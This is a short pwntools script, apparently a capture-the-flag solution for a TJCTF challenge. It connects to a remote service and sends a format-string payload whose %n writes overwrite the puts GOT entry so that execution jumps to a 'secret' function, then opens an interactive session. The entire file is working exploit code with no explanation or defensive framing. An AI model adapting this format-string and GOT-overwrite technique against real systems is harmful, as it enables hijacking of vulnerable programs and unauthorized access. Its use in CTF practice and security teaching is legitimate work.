from pwn import *

# context.log_level = 'debug'
# context.binary = './secure'

# sh = process('./secure')
sh = remote('problem1.tjctf.org', 8008)

secret_addr = 0x08048713
puts_got = 0x0804a028

payload = p32(puts_got)
payload += p32(puts_got+2)
payload += '%35$34571x'
payload += '%35$n'
payload += '%36$33009x'
payload += '%36$n'
payload += '\n'

sh.sendafter('> ', '12345\n')
sh.sendafter('> ', payload)
sh.sendafter('> ', '12345\n')
sh.interactive()

